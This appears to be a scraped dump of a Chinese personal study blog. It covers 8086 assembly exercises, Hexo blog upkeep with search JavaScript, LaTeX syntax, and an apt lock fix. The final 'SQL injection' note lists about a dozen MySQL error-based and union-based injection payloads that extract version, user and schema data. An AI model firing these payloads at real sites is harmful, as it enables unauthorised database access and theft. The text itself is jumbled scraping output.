dx和ax分别存放100001的高16位和低16位值，所以将100001表示为16进制的形式：186a1h. 程序如下： 123456789101112131415161718DATAS SEGMENT ;此处输入数据段代码DATAS ENDSSTACKS SEGMENT ;此处输入堆栈段代码STACKS ENDSCODES SEGMENT ASSUME CS:CODES,DS:DATAS,SS:STACKSSTART: mov dx,1 mov ax,86a1h mov bx,100 div bx mov ax,4c00h int 21hCODES ENDS END START 程序执行后，ax=03e8h,dx=1（余数是1），在debug中查看如下所示： 123456789101112131415161718192021-pAX=86A1 BX=0000 CX=0010 DX=0001 SP=0000 BP=0000 SI=0000 DI=0000DS=0BA5 ES=0BA5 SS=0BB5 CS=0BB5 IP=0006 NV UP EI PL NZ NA PO NC0BB5:0006 BB6400 MOV BX,0064-pAX=86A1 BX=0064 CX=0010 DX=0001 SP=0000 BP=0000 SI=0000 DI=0000DS=0BA5 ES=0BA5 SS=0BB5 CS=0BB5 IP=0009 NV UP EI PL NZ NA PO NC0BB5:0009 F7F3 DIV BX-pAX=03E8 BX=0064 CX=0010 DX=0001 SP=0000 BP=0000 SI=0000 DI=0000DS=0BA5 ES=0BA5 SS=0BB5 CS=0BB5 IP=000B NV UP EI PL NZ AC PO NC0BB5:000B B8004C MOV AX,4C00-pAX=4C00 BX=0064 CX=0010 DX=0001 SP=0000 BP=0000 SI=0000 DI=0000DS=0BA5 ES=0BA5 SS=0BB5 CS=0BB5 IP=000E NV UP EI PL NZ AC PO NC0BB5:000E CD21 INT 21-p 伪指令dd (double word) dd用来定义dword(双字型)数据，占两个字 db 字节型数据 , db 'Hello' 其中每个字母占一个字节 dw 字型数据 dd dword (double word)双字型数据 12345data segment db 1 ; 一字 dw 1 ; 一字 dd 1 ; 两字data ends 例: 用div计算data段中第一个数据除以第二个数据后,商存放到第三个数据的存储单元中. 余数存储到第四个存储单元中. 12345678910111213141516171819202122;用div计算data段中第一个数据除以第二个数据后,商存放到第三个数据的存储单元中.;余数存储到第四个存储单元中.assume cs:codesg,ds:datasgdatasg segment ;储存 0B60:0 F A1 86 01 00 64 00 00 00 00 00 dd 100001 dw 100 dw 0 dw 0datasg endscodesg segmentstart: mov ax,datasg mov ds,ax mov ax,ds:[0] ;ax存储低16位 mov dx,ds:[2] ;dx存储高16位 div word ptr ds:[4] ;计算除法 mov ds:[6],ax ;商存储第3个单元 mov ds:[8],dx ;余数存储第4个单元 mov ax,4c00h int 21hcodesg endsend start 操作符dup dup 用来进行数据重复的 db 3 dup (0) ;定义了3个字节,相当于db 0,0,0 db 3 dup (0,1,2) ;定义了9个字节,相当于db 0,1,2,0,1,2,0,1,2 db 3 dup ('abc','ABC') 定义了18个字节, 相当于 db 'abcABCabcABCabcABC' 可见dup的使用格式如下: db 重复的次数 dup(重复的字节型数据) dw 重复的次数 dup(重复的字型数据) dd 重复的次数 dup(重复的双字数据) 例: 定义一个容量为200个字节的栈段 12345678910111213141516171819 stack segment dw 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 dw 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 dw 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 dw 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 dw 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 stack ends stack segment dw 200 dup (0) stack ends 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113;结构体定义;char year[4] // 年; 空格(1 Byte);int income (4 Bytes)// 收入; 空格;empoyer num (2 Bytes) // 雇员数; 空格;人均收入 (2 Bytes); 空格; 要求：将data段的数据拷贝进table段数据，并结构化如上述格式，然后计算21年的人均收入assume ds:data, es:table, cs:code, ss:stackdata segment db &#x27;1975&#x27;, &#x27;1976&#x27;, &#x27;1977&#x27;, &#x27;1978&#x27;, &#x27;1979&#x27;, &#x27;1980&#x27;, &#x27;1981&#x27;, &#x27;1982&#x27;, &#x27;1983&#x27; db &#x27;1984&#x27;, &#x27;1985&#x27;, &#x27;1986&#x27;, &#x27;1987&#x27;, &#x27;1988&#x27;, &#x27;1989&#x27;, &#x27;1990&#x27;, &#x27;1991&#x27;, &#x27;1992&#x27; db &#x27;1993&#x27;, &#x27;1994&#x27;, &#x27;1995&#x27; dd 16, 22, 382, 1356, 2390, 8000, 16000, 24486, 50065, 97479, 140417, 197514 dd 345980, 590827, 803530, 1183000, 1843000, 2759000, 3753000, 4649000, 5937000 dw 3, 7, 9, 13, 28, 38, 130, 220, 476, 778, 1001, 1442, 2258, 2793, 4037, 5635, 8226 dw 11542, 14430, 15257, 17800 data ends table segment db 21 dup (&#x27;year summ ne ?? &#x27;) table ends ; 弄个栈，没什么用; 就有时候用来腾出个寄存器stack segment dw 2 dup(0)stack endscode segmentstart:; 设置data段，以及ds:bx指向data段的第一个单元，即ds:[bx]的内容就是data段第一个单元的内容mov ax, datamov ds, ax; 设置table段mov ax, tablemov es, ax; 设置堆栈段mov ax, stackmov ss, axmov sp, 16; 初始化三个变址寄存器mov bx, 0 mov si, 0 mov di, 0; 准备复制，需要用到循环，21次mov cx, 21s: ; 年 mov ax, ds:[bx+0] ; 这里写个0是为了下面的对照，清晰点 mov es:[si+0], ax mov ax, ds:[bx+2] mov es:[si+2], ax ; 空格 mov al, 32 mov es:[si+4], al ; 收入 mov ax, ds:[bx+84] mov es:[si+5], ax mov ax, ds:[bx+86] mov es:[si+7], ax ; 空格 mov al, 32 mov es:[si+9], al ; 雇员数 mov ax, ds:[bx+168] ;****这里不满足 mov es:[si+0ah], ax ; 空格 mov al, 32 mov es:[si+0ch], al ; 算人均收入，这里小心高低位， mov ax, ds:[bx+84] mov dx, ds:[bx+86] push cx ; 临时用一下cx，因为不可以 div ds:[bx+168] 因为内存单元中的长度为8位，实际除数应该设置为16位 mov cx, ds:[bx+168] ;*****这里同上，也不满足 div cx pop cx mov es:[si+0dh], ax ; 空格 mov al, 32 mov es:[si+0fh], al add si, 16 add bx, 4 loop s mov ax,4c00h int 21h code endsend start 这里发现有两个个地方不满足变化的规律，就是下面这两个地方： 123456789101112131、 ; 雇员数 mov ax, ds:[bx+168] ;****这里不满足 mov es:[si+0ah], ax2、 ; 算人均收入，这里小心高低位， mov ax, ds:[bx+84] mov dx, ds:[bx+86] push cx ; 临时用一下cx，因为不可以 div ds:[bx+168] mov cx, ds:[bx+168] ;*****这里同上，也不满足 div cx pop cx mov es:[si+0dh], ax 第一次bx为0的时候，是正确的，但第二次bx加了4之后，[bx+168]就变成了172了，正确的应该是170，所以这里是不满足的。那怎么办呢？ 我们还有两个变址寄存器没出动呢，那我们现在就再出动 di 这个变址寄存器，来表示红笔３处的变址。上面两个不满足的地方也修改如下： １、 ; 雇员数 mov ax, ds:[di+168] ;****修改这里 mov es:[si+0ah], ax ２、 ; 算人均收入，这里小心高低位， mov ax, ds:[bx+84] mov dx, ds:[bx+86] push cx ; 临时用一下cx，因为不可以 div ds:[bx+168] mov cx, ds:[di+168] ;*****也修改这里 div cx pop cx mov es:[si+0dh], ax ３、 ; di还要记住在最后加上2 add si, 16 add bx, 4 add di, 2 ; 这里记住要加上２ loop s 做了上面这三步修改，就基本完成了 最终代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114;结构体定义;char year[4] // 年; 空格(1 Byte);int income (4 Bytes)// 收入; 空格;empoyer num (2 Bytes) // 雇员数; 空格;人均收入 (2 Bytes); 空格; 要求：将data段的数据拷贝进table段数据，并结构化如上述格式，然后计算21年的人均收入assume ds:data, es:table, cs:code, ss:stackdata segment db &#x27;1975&#x27;, &#x27;1976&#x27;, &#x27;1977&#x27;, &#x27;1978&#x27;, &#x27;1979&#x27;, &#x27;1980&#x27;, &#x27;1981&#x27;, &#x27;1982&#x27;, &#x27;1983&#x27; db &#x27;1984&#x27;, &#x27;1985&#x27;, &#x27;1986&#x27;, &#x27;1987&#x27;, &#x27;1988&#x27;, &#x27;1989&#x27;, &#x27;1990&#x27;, &#x27;1991&#x27;, &#x27;1992&#x27; db &#x27;1993&#x27;, &#x27;1994&#x27;, &#x27;1995&#x27; dd 16, 22, 382, 1356, 2390, 8000, 16000, 24486, 50065, 97479, 140417, 197514 dd 345980, 590827, 803530, 1183000, 1843000, 2759000, 3753000, 4649000, 5937000 dw 3, 7, 9, 13, 28, 38, 130, 220, 476, 778, 1001, 1442, 2258, 2793, 4037, 5635, 8226 dw 11542, 14430, 15257, 17800 data ends table segment db 21 dup (&#x27;year summ ne ?? &#x27;) table ends ; 弄个栈，没什么用; 就有时候用来腾出个寄存器stack segment dw 2 dup(0)stack endscode segmentstart:; 设置data段，以及ds:bx指向data段的第一个单元，即ds:[bx]的内容就是data段第一个单元的内容mov ax, datamov ds, ax; 设置table段mov ax, tablemov es, ax; 设置堆栈段mov ax, stackmov ss, axmov sp, 16; 初始化三个变址寄存器mov bx, 0 mov si, 0 mov di, 0; 准备复制，需要用到循环，21次mov cx, 21s: ; 年 mov ax, ds:[bx+0] ; 这里写个0是为了下面的对照，清晰点 mov es:[si+0], ax mov ax, ds:[bx+2] mov es:[si+2], ax ; 空格 mov al, 32 mov es:[si+4], al ; 收入 mov ax, ds:[bx+84] mov es:[si+5], ax mov ax, ds:[bx+86] mov es:[si+7], ax ; 空格 mov al, 32 mov es:[si+9], al ; 雇员数，小心处理 mov ax, ds:[di+168] mov es:[si+0ah], ax ; 空格 mov al, 32 mov es:[si+0ch], al ; 算人均收入，这里小心高低位 mov ax, ds:[bx+84] mov dx, ds:[bx+86] push cx ; 临时用一下cx，因为不可以 div ds:[bx+168] mov cx, ds:[di+168] ; mov cx, ds:[bx+168]错误了。。。 div word ptr cx pop cx mov es:[si+0dh], ax ; 空格 mov al, 32 mov es:[si+0fh], al add si, 16 add bx, 4 add di, 2 ; 这里记住要加上２ loop s mov ax,4c00h int 21h code endsend start https://blog.csdn.net/dylgsy/article/details/3984623"},{"title":"汇编学习第六章","date":"2019-10-21","updated":"2024-03-19","path":"2019/10/21/汇编学习第六章/","text":"指令 dw (define word) 用来定义数据。 dw 0122h,089h,a478h start (伪指令) 指明程序入口所在，当程序中含有数据段code segment,初始化时cs为code地址，但是程序不应该从这个地址执行，程序应该从程序段执行，在程序段前面加上start来设置ip指向程序段地址 1234567891011assume cs:codecode segment dw 0123h,...,0486h start: mov ax,code [程序区] mov ax,4c00h int 21hcode endsend start 实验 123456789101112131415161718192021222324252627assume cs:code,ds:data,ss:stackdata segment dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987hdata endsstack segment dw 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0stack endscode segmentstart: mov ax,stack mov ss,ax mov sp,16 mov ax,data mov ds,ax push ds:[0] push ds:[2] pop ds:[2] pop ds:[0] mov ax,4c00h int 21hcode endsend start cs的值就是 assume cs:xxx 中指定的xxx地址 若code的地址为 X ，则stack的地址为 X-2 ,data地址为 X-3 计算方法： 设data地址为 XXX,data中的数据大小为 ndatan_{data}ndata​ 字节,则stack地址 nstackn_{stack}nstack​ 计算方法: nstack∗16=X∗16+ndata(1) n_{stack}*16=X*16+n_{data} \\tag{1} nstack​∗16=X∗16+ndata​(1) nstack=(X+⌊ndata÷16⌋)(2) n_{stack}=(X+\\lfloor n_{data}\\div 16\\rfloor) \\tag{2} nstack​=(X+⌊ndata​÷16⌋)(2) (1)式利用字节数建立一个等式，(2)式代表nsn_sns​值 code段计算方式同理，看stack段中存储了多少字节(16的倍数),如果是n倍的16，则ncode=nstack+nn_{code}=n_{stack}+nncode​=nstack​+n 内存定位 基础知识点： and和or指令的用法； 通过db ‘（字母）’的形式将对应的ASCII码值提取出来，db的意思是define byte； 字母的大小写转换问题，仔细研究一下ASCII表中大小写字母的区别，差值固定； [bx + idata] 的意思是 [（bx）+ idata]（意义：为高级语言实现数组提供了便利机制）； 提供了SI，DI两个16位寄存器，但是这两个寄存器并不能拆分成两个8位寄存器，功能和BX相近； 二重循环问题的处理: 开辟一块栈空间来保存 外层循环的 CX 寄存器的值 结论： [idata]用一个常量来表示地址，可用于直接定位一个内存单元； [bx]用一个变量来表示内存地址，可用于间接定位一个内存单元； [bx+idata]用一个变量和常量表示地址，可在一个其实地址的基础上用变量简洁的定位一个内存单元； [bx+si]用两个变量表示地址； [bx+si+idata]用两个变量和一个常量表示地址。"},{"title":"汇编学习第七章","date":"2019-10-21","updated":"2024-03-19","path":"2019/10/21/汇编学习第七章/","text":""},{"title":"汇编学习2019-10-21","date":"2019-10-20","updated":"2024-03-19","path":"2019/10/20/汇编学习第五章/","text":"第五章 注意事项 汇编源程序中，不能以字母开头，要在前面加0 1mov ah,0ffffh Debug 和 masm编译器对形如mov ax,[idata] 这类指令在解释上的不同。 debug对其解释为[idata]的一个内存单元，而编译器解释为数据idata 在汇编源程序中[idata]的用法 如果idata是实数，必须显式的在[]前面给出段地址 mov al,ds:[0]，或者用寄存器中的值当做段地址(段前缀) mov al,ds:[bx] 如果idata代表一个寄存器bx ax ... 则[bx]直接代表了bx寄存器中地址处的值 段前缀 出现在访问内存单元的指令中，用于显式的指明内存单元的段地址的 1234ds:cs:ss:es: 在汇编语言中称为段前缀 安全的代码区域 在一般PC机中，DOS方式下，DOS和其他合法程序一样不会使用 0:200~0:2ff(00200h~002ffh)的256字节，这段空间是安全的，进入debug后查看一下这段内存空间，全是0表明没有被使用。 第5章课后实验 将mov ax,4c00H之前的指令复制到0:200处: 123456789101112131415161718192021assume cs:codecode segment mov ax,cs ; or mov ax,code mov ds,ax mov ax,0020H mov es,ax mov bx,0 mov cx,18H ; or sub cx,5 s: mov al,[bx] mov es:[bx],al inc bx loop s mov ax,4c00H int 21Hcode endsend mov cx,18H 解释: 将程序debug后发现代码段 mov ax,4c00H 地址为0017H."},{"title":"汇编学习2019-10-20","date":"2019-10-20","updated":"2024-03-19","path":"2019/10/20/汇编学习2019-10-20/","text":"一段内存，既可以是代码存储空间，又是数据的存储空间，还可以是栈空间，也可以设么也不是，它们主要取决于cpu中寄存器的设置 CS(Code segment),IP(instruction pointer) :代码段 SS(stack segment),SP(stack pointer) :栈段 DS(date segment) :数据段 debug在修改寄存器ss时候，下一条指令也紧接着被执行例如: 123mov ss,axmov ss,[0]pop ss 汇编程序 汇编程源程序中有两类指令，一是汇编指令，第二是伪指令，汇编指令是有对应的机器码的指令，伪指令是由编译器来执行的。 目的 相关指令 指令性质 指令执行者 通知某一寄存器和程序中的某个段相联系 assume 寄存器:段名 伪指令 编译时，由编译期执行 通知编译器一个段开始 段名 segment 伪指令 编译时，由编译期执行 通知编译器一个段结束 段名 ends 伪指令 编译时，由编译期执行 程序返回 mov ax,4c00H int 21H 伪指令 编译时，由编译期执行 程序结束 段名 end 伪指令 编译时，由mov编译期执行 EXE文件加载 找到一段起始地址为SA:0000的容量足够的空闲内存区（复习操作系统中寻找内存空间的相关内容） 在这段内存前256字节中，创建一个程序段前缀（PSP）的数据区，DOS要利用PSP来和被加载程序进行通信 从这段内存的256字节出开始（PSP后面），将程序装入，程序地址被设为 SA+10H:0 ; 空闲内存区： SA:0 PSP区： SA:0 程序区: SA+10H:0 PSP区和程序区虽然物理地址连续，但是却有不同的段地址 PSP头两个字节是 CD 20 程序装入，程序的地址被设为SA+10H:0 （其中SA为系统为程序分配内存的起始位置的段地址，这个段地址被存放在DS寄存器当中，所以，从DS寄存器中可以得到PSP的段地址 ）因为PSP占256字节（100H)，所以程序的物理地址为 SA16+256 --&gt; SA16+16*16 --&gt; (SA+16)*16 --&gt; SA+10H； debug后CS值比DS大10H，CS为代码段寄存器(程序区)，DS为数据段(初始时==SA) 汇编文件编写及生成exe等文件 编写下列代码进入文件t1.asm 12345678910111213141516171819202122assume cs:codesgcodesg segment mov ax,2000H mov ss,ax mov sp,0 add sp,10 pop ax pop bx push ax push bx pop ax pop bx mov ax,4c00H int 21Hcodesg endsend 注意上面的add sp,10 10后面没有H(即不是10H),就代表这是十进制写法，sp=10–&gt; sp=000a H 进行编译，链接 生成exe 12masm ti.asm;link t1.obj; 指令执行过程 push ax是入栈指令，在执行push ax时，cpu先将 SP=SP-2然后再将数据送入SS:SP指向的内存单元 pop ax是出栈指令，CPU先读取SS:SP处的数据，再SP=SP+2 指令学习 inc inc bx 含义是bx中的内容加一 [bx] [bx] : 类比[idata]的含义: DS中的数据段地址偏移量为idata处的值，则[bx]含义为将bx中的值作为偏移(段地址存在DS中) 1mov ax,[bx] 功能: bx中存放的数据作为一个偏移地址EA，段地址SA默认在ds中，将SA:EA处的数据送入ax中。即:((ds)*16+(bx))=(ax) Loop CPU执行Loop指令时要进行两步操作: 1. (cx)=(cx)-1 2. 判断cx中的值，不为零则转至标号处执行程序，如果为0则向下执行"},{"title":"博客使用备忘录","date":"2019-10-14","updated":"2024-03-19","path":"2019/10/14/博客使用备忘录/","text":"写文章 2019.11.24更新!!: 多平台同步问题！！ 使用前一定要先同步！！ kali上: git pull windows上: git pull or HexoSyn hexo new 文章名 这一步后会在source\\ _post\\ 目录下生成相应的文章 进入相应目录 haroopad 文章名 &amp; 保存 或者Typora打开文章,但是写完之后要注意图片同步问题 上传文章 同步图片不需要了hexoImgCp hexo g 生成静态页面 hexo d 提交github 上传本地 更新后的环境！ kali: 123git add .git commit -m &quot;kali提交说明: &quot;git push origin master windows: 1bash HexoUpload 或者: 123git add .git commit -m &quot;Windows提交说明: &quot;git push origin master 图片保存 图片保存在 public/img 中 文章中引用: /img/xxx.png Typora配置中图片保存在/img/ (系统img目录)下,需要在同步一次图片到上传目录下 hexoImgCp 2019.11.23更新 上述图片保存路径废弃，新的保存路径如下: 图片保存在 文章同目录下的与文章同名的文件夹内 (source/_post/xxx文件夹) 文章中引用: 文章名/图片名 Typora配置中图片保存在 ./${filename} 下,不需要上述同步过程 2022.5.13更新 source/_data/butterfly.yml配置文件优先级高于themes/Butterfly/_config.yml 修改博客背景图片等图片资源 放在themes/Butterfly/source/img/下 ， hexo g后会把此目录下的文件拷贝到public/img/中 新建source/images文件夹，主题配置文件source/_data/butterfly.yml中的博客背景图片等图片资源也可放在此文件夹下，hexo g后会将此文件夹内容复制到public/images文件夹 本地搜索使用xml格式对文章内容支持性不好，经常出现特殊字符导致的xml格式错误，所以改用JSON格式。修改Butterfly中的源码themes/Butterfly/source/js/search/local-search.js，修改如下: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116$(function () &#123; var loadFlag = false // 预加载content.json search(GLOBAL_CONFIG.localSearch.path) loadFlag = true $(&#x27;a.social-icon.search&#x27;).on(&#x27;click&#x27;, function () &#123; $(&#x27;body&#x27;).css(&#x27;width&#x27;, &#x27;100%&#x27;) $(&#x27;body&#x27;).css(&#x27;overflow&#x27;, &#x27;hidden&#x27;) $(&#x27;.search-dialog&#x27;).animate(&#123; &#125;, function () &#123; $(&#x27;.search-dialog&#x27;).css(&#123; &#x27;display&#x27;: &#x27;block&#x27;, &#x27;animation&#x27;: &#x27;titlescale 0.5s&#x27; &#125;), 300 &#125;) $(&#x27;#local-search-input input&#x27;).focus() $(&#x27;.search-mask&#x27;).fadeIn(); if (!loadFlag) &#123; search(GLOBAL_CONFIG.localSearch.path) loadFlag = true &#125; // shortcut: ESC document.addEventListener(&#x27;keydown&#x27;, function f(event) &#123; if (event.code === &#x27;Escape&#x27;) &#123; closeSearch() document.removeEventListener(&#x27;keydown&#x27;, f) &#125; &#125;) &#125;) var closeSearch = function () &#123; $(&#x27;body&#x27;).css(&#x27;overflow&#x27;, &#x27;auto&#x27;) $(&#x27;.search-dialog&#x27;).animate(&#123; &#125;, function () &#123; $(&#x27;.search-dialog&#x27;).css(&#123; &#x27;display&#x27;: &#x27;none&#x27; &#125;) &#125;) $(&#x27;.search-mask&#x27;).fadeOut(); &#125; $(&#x27;.search-mask, .search-close-button&#x27;).on(&#x27;click&#x27;, closeSearch) function search(path) &#123; $.ajax(&#123; url: GLOBAL_CONFIG.root + path, dataType: &#x27;json&#x27;, success: function (xmlResponses) &#123; // get the contents from search data var datas = $(xmlResponses).map(function () &#123; return &#123; title: this.title, content: this.content, url: this.url &#125; &#125;).get() var $input = $(&#x27;#local-search-input input&#x27;) [0] //---- 添加结果区域---- $(&#x27;#local-stats&#x27;).append(&#x27;&lt;div class=&quot;search-result-list&quot; id=&quot;resultDis&quot;&gt;&lt;/div&gt;&#x27;) $input.addEventListener(&#x27;input&#x27;, function () &#123; //var str = &#x27;&lt;div class=&quot;search-result-list&quot;&gt;&#x27; //------清除展示区域----- $(&#x27;#resultDis&#x27;).empty() // var keywords = this.value.trim().toLowerCase().split(/[\\s]+/) //$resultContent.innerHTML = &#x27;&#x27; if (this.value.trim().length &lt;= 0) &#123; $(&#x27;.local-search-stats__hr&#x27;).hide() return &#125; var count = 0 // 去除content中的&lt;xxx&gt; 和 ![xxx](xxxx)图像内容 var regSContent = new RegExp(&#x27;!\\\\[[^\\\\]]*\\\\]\\\\([^\\\\)]*\\\\)|&lt;[^&gt;]+&gt;|top_img: /.*(png|jpg|gif)|cover: /.*(png|jpg|gif)&#x27;, &#x27;gi&#x27;); // perform local searching datas.forEach(function (data) &#123; var isMatch = true var dataTitle = data.title.trim().toLowerCase() var dataContent = data.content.trim().replace(regSContent, &#x27;&#x27;).toLowerCase() //去除&lt;xxx&gt; var dataUrl = data.url var indexTitle = - 1 var indexContent = - 1 var tmpDisplayContent = &#x27;&#x27; // only match artiles with not empty titles and contents if (dataTitle !== &#x27;&#x27; || dataContent !== &#x27;&#x27;) &#123; keywords.forEach(function (keyword, i) &#123; indexTitle = dataTitle.indexOf(keyword) indexContent = dataContent.indexOf(keyword) if (indexTitle &lt; 0 &amp;&amp; indexContent &lt; 0) &#123; isMatch = false &#125; else &#123; if (indexContent &lt; 0) &#123; indexContent = 0 &#125; &#125; &#125;) &#125; // show search results if (isMatch) &#123; // 截取100长度的内容也展示出来,若只匹配了标题 则展示文章开头15个字符 ，对中间的关键词加粗处理 tmpDisplayContent = dataContent.substring(indexContent - 50, indexContent + 50) keywords.forEach(function (keyword) &#123; var regS = new RegExp(keyword, &#x27;gi&#x27;); tmpDisplayContent = tmpDisplayContent.replace(regS, &#x27;&lt;mark style=&quot;color: white; background-color:green&quot;&gt;&#x27; + keyword + &#x27;&lt;/mark&gt;&#x27;); &#125;); $(&#x27;#resultDis&#x27;).append(&#x27;&lt;div style=&quot;border-top: 1px solid #dddddd&quot; class=&quot;local-search__hit-item&quot;&gt;&#x27; + &#x27;&lt;a href=&quot;&#x27; + dataUrl + &#x27;&quot; class=&quot;search-result-title&quot;&gt;&#x27; + &#x27;&lt;strong&gt;《&#x27; + dataTitle + &#x27;》:&lt;/strong&gt; &quot; &#x27; + tmpDisplayContent + &#x27; &quot;&#x27; + &#x27;&lt;/a&gt;&#x27; + &#x27;&lt;/div&gt;&#x27; ) count += 1 $(&#x27;.local-search-stats__hr&#x27;).show() &#125; &#125;) if (count === 0) &#123; str += &#x27;&lt;div id=&quot;local-search__hits-empty&quot;&gt;&#x27; + GLOBAL_CONFIG.localSearch.languages.hits_empty.replace(/\\$\\&#123;query&#125;/, this.value.trim()) + &#x27;&lt;/div&gt;&#x27; &#125; $(&#x27;#local-hits&#x27;).append(&#x27;&lt;p&gt;未搜索到相关结果&lt;/p&gt;&#x27;) &#125;) &#125; &#125;) &#125;&#125;) 新建themes/Butterfly/source/css/my_background.css文件来更改博客背景渐变色 博客查看 可以 hexo server 然后在本地查看效果"},{"title":"Latex公式","date":"2019-10-13","updated":"2024-03-19","path":"2019/10/13/Latex公式/","text":"math KaTex a1x2bij3e2≠(ex)2ex2(1)a_{1}\\qquad x^2 \\quad b^{3}_{ij} \\quad e^{2}\\neq (e^x)^2 \\quad e^{x^2}\\tag{1} a1​x2bij3​e2=(ex)2ex2(1) xx3x2+y(2)\\sqrt{x} \\quad \\sqrt[3]{x} \\quad \\sqrt{x^{2}+ \\sqrt{y}}\\tag{2} x​3x​x2+y​​(2) x2k+1x2k+1x1/2(3)\\frac{x^2}{k+1} \\quad x^{\\frac{2}{k+1}} \\quad x^{1/2}\\tag{3} k+1x2​xk+12​x1/2(3) αβγσωδπρϵηλμξτκζϕχ(4)\\alpha \\beta \\gamma \\sigma \\omega \\delta \\pi \\rho \\epsilon \\eta \\lambda \\mu \\xi \\tau \\kappa \\zeta \\phi \\chi \\tag{4} αβγσωδπρϵηλμξτκζϕχ(4) &lt;&gt;≤≥≠≈∼⊆∈∉×÷±⇒→∞∂∠△(5)\\lt \\gt \\le \\ge \\ne \\approx \\sim \\subseteq \\in \\notin \\times \\div \\pm \\Rightarrow \\rightarrow \\infty \\partial \\angle \\triangle \\tag{5} &lt;&gt;≤≥=≈∼⊆∈∈/×÷±⇒→∞∂∠△(5) (1,2,4)[3,5,9](6)\\left (1,2,4\\right) \\qquad \\left [ 3,5,9 \\right ]\\tag{6} (1,2,4)[3,5,9](6) .oschina.io‾+lindexi.github.io‾(7)\\overline{.oschina.io}+\\underline{lindexi.github.io}\\tag{7} .oschina.io+lindexi.github.io​(7) sin⁡θcos⁡θtan⁡θcot⁡θ(8)\\sin\\theta \\qquad \\cos\\theta \\qquad \\tan\\theta \\qquad \\cot \\theta\\tag{8} sinθcosθtanθcotθ(8) lg⁡Xlog⁡Xlog⁡310(9)\\lg X \\qquad \\log X \\qquad \\log_ 3 10\\tag{9} lgXlogXlog3​10(9) δLeftCenterRight10.241252−11+i−991688−3344\\begin{array} {c|lcr} \\delta &amp; \\text{Left} &amp; \\text{Center} &amp; \\text{Right} \\\\ \\hline 1 &amp; 0.24 &amp; 125 \\\\ 2 &amp; -1 &amp; {1+i} &amp; -99 \\\\ 16 &amp; 88 &amp; -33 &amp; 44 \\\\ \\end{array} δ1216​Left0.24−188​Center1251+i−33​Right−9944​​ (1x248)\\begin{pmatrix} 1 &amp; x^2 \\\\ 4 &amp; 8 \\end{pmatrix} (14​x28​) [1x248]\\begin{bmatrix} 1 &amp; x^2 \\\\ 4 &amp; 8 \\end{bmatrix} [14​x28​] {1x248}\\begin{Bmatrix} 1 &amp; x^2 \\\\ 4 &amp; 8 \\end{Bmatrix} {14​x28​} ∣1x248∣\\begin{vmatrix} 1 &amp; x^2 \\\\ 4 &amp; 8 \\end{vmatrix} ​14​x28​​ ∥1x248∥\\begin{Vmatrix} 1 &amp; x^2 \\\\ 4 &amp; 8 \\end{Vmatrix} ​14​x28​​ 代码段 1ls -a 123&lt;?phpphpinfo();?&gt; 链接 链接 基本算式 算式 markdown \\frac{7x+5}{1+y^2} z=z_l \\cdots \\frac{d}{dx}e{ax}=ae{ax}\\quad \\sum_{i=1}^{n}{(X_i - \\overline{X})^2} \\sqrt{2};\\sqrt[n]{3} \\vec{a} \\cdot \\vec{b}=0 \\int ^2_3 x^2 {\\rm d}x $$ limn→+∞nlimn→+∞n \\lim_{n\\rightarrow+\\infty} n \\sum \\frac{1}{i^2} \\frac{1}{i^2} 希腊字母 大写 markdown 小写 markdown A \\alpha B \\beta \\Gamma \\gamma \\Delta \\delta E \\epsilon \\varepsilon Z \\zeta \\Theta \\theta I \\iota K \\kappa \\Lambda \\lambda M \\mu N \\nu \\Xi \\xi O \\omicron \\Pi \\pi P \\rho \\Sigma \\sigma N \\nu T \\tau \\Upsilon \\upsilon \\Phi \\phi \\varphi X \\chi \\Psi \\psi \\Omega \\omega 三角函数 算式 markdown \\sin 对数函数 算式 markdown \\ln15 \\log_2 10 \\lg7 关系运算符 运算符 markdown \\pm \\times \\div \\sum \\prod \\neq \\leq \\geq \\bigcap"},{"title":"apt锁","date":"2019-10-13","updated":"2024-03-19","path":"2019/10/13/apt锁/","text":"问题：E: Could not get lock /var/lib/dpkg/lock – open (11: Resource temporarily unavailable) E: Could not get lock /var/lib/dpkg/lock - open (11: Resource temporarily unavailable) E: Unable to lock the administration directory (/var/lib/dpkg/), is another process using it? 解决 因为有另外一个程序在运行，导致锁不可用。原因可能是上次运行更新或安装没有正常完成。解决办法是杀死此进程 12345sudo rm /var/cache/apt/archives/locksudo rm /var/lib/dpkg/locksudo dpkg --configure -asudo apt-get update"},{"title":"sql注入","date":"2019-10-13","updated":"2024-03-19","path":"2019/10/13/sql注入/","text":"1、通过floor报错,注入语句如下: and select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a); 2、通过ExtractValue报错,注入语句如下: and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1))); 3、通过UpdateXml报错,注入语句如下: and 1=(updatexml(1,concat(0x3a,(select user())),1)) 4、通过NAME_CONST报错,注入语句如下: and exists(selectfrom (selectfrom(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c) 5、通过join报错,注入语句如下: select * from(select * from mysql.user ajoin mysql.user b)c; 6、通过exp报错,注入语句如下: and exp(~(select * from (select user () ) a) ); 7、通过GeometryCollection()报错,注入语句如下: and GeometryCollection(()select *from(select user () )a)b ); 8、通过polygon ()报错,注入语句如下: and polygon (()select * from(select user ())a)b ); 9、通过multipoint ()报错,注入语句如下: and multipoint (()select * from(select user() )a)b ); 10、通过multlinestring ()报错,注入语句如下: and multlinestring (()select * from(selectuser () )a)b ); 11、通过multpolygon ()报错,注入语句如下: and multpolygon (()select * from(selectuser () )a)b ); 12、通过linestring ()报错,注入语句如下: and linestring (()select * from(select user() )a)b ); 列出所有的数据库 1&#x27; union select 1,2,group_concat(char(32,58,32),schema_name),4 from information_schema.schemata;# 盲注 